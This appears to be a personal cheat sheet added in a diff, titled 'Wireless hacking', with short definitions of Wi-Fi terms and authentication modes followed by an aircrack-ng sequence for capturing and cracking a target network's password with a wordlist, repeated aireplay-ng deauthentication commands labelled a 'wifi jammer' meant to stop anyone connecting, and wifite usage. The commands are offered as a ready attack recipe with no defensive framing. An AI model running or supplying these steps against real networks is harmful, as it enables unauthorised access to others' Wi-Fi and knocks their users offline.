@@ -1,0 +1,58 @@
+===================================================================Wireless hacking=========================================================================
+
+#Introduction to Hacking Wireless Networks
+Wireless networks come with excellent advantages- connectivity beyond walls, wireless connection, easy to access internet even in areas where laying cables is difficult, speed and sharing. But, wireless networks have a few disadvantages, the major issue being- the questionable security.
+
+#Important Terms:
+1) Access Point: The point where the mobile device, computers connect to the wireless network.
+
+2) SSID: Service Set Identifier identifies the access point, it is a human-readable text which when broadcasted leads to the identification of an access point. 
+
+3) BSSID: Mac address of the Access point.
+
+4) Bandwidth: Amount of information that can be transferred over the connection.
+
+#Authentication: img
+https://www.computer-networking-success.com/wireless-networking-basics.html#sthash.tihe8vJl.QuwMw6Sw.dpbs
+#Open Authentication:
+When a client wants to connect to an open access point he/she sends a probe request, and the AP sends a probe response; the client then sends an authentication request. Upon receiving a response, the client establishes an association with the AP.
+
+#Shared Key Authentication Process
+Here, the client sends a probe request, and the access point sends the probe response; then, the client requests for an authentication request, the AP sends an authentication challenge to the client. The client needs to send the shared key as authentication challenge response. AP, then, verifies the client and authenticates him/her, who then establishes a connection with the access point.
+
+#Centralised Authentication:
+In the corporate environment, instead of an Access point verifying client’s authentication details, a centralised server does the job of verifying the client. RADIUS is a centralised authentication server which verifies clients who want to connect with the access point.
+
+Wifi :-
+
+--> ifconfig
+--> iwconfig
+--> airmon-ng check kill
+--> airmon-ng start wlan0
+--> iwconfig (see mode : monitor)
+--> airodump-ng wlan0 (look your target and interrupt when you find the target)
+--> airodump-ng --bssid <bssid> -c <Channel No.> -w /root/Desktop/wificonnect wlan0
+--> aircrack-ng /root/Desktop/wificonnect-01.cap -w /usr/share/wordlists/rockyou.txt
+
+--> open new terminal
+aireplay-ng -0 0 -a <router bssid/mac> -c <station bssid/mac> wlan0mon
+for no one can connect to wifi
+aireplay-ng --deauth 100000 -a B4:3D:08:7C:0A:58 -c 64:A2:00:CB:D3:AB  wlan0
+
+
+wifi jammer :-
+for single target
+
+aireplay-ng -0 0 -a <router bssid/mac> -c <station bssid/mac> wlan0mon
+for no one can connect to wifi
+aireplay-ng --deauth 100000 -a B4:3D:08:7C:0A:58 -c 64:A2:00:CB:D3:AB  wlan0
+
+
+wifite :-
+
+wifite --wep
+--> wifite --wpa
+--> just give number of your target 
+
+How much is your password is secure :- website - https://howsecureismypassword.net/
+
